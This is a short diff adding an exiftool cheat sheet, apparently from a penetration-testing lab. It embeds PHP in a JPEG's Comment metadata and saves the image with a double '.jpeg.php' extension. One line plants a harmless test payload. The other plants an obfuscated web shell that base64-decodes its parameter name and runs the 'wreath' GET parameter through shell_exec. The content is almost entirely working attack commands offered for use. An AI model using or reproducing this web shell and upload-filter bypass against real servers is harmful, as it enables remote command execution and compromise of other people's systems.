@@ -1,0 +1,9 @@
+### exiftool ###
+# test
+exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" test-leopoldine.jpeg.php
+
+# shell, .php?wreath=cmd
+exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" shell-leopoldine.jpeg.php
+
+
+
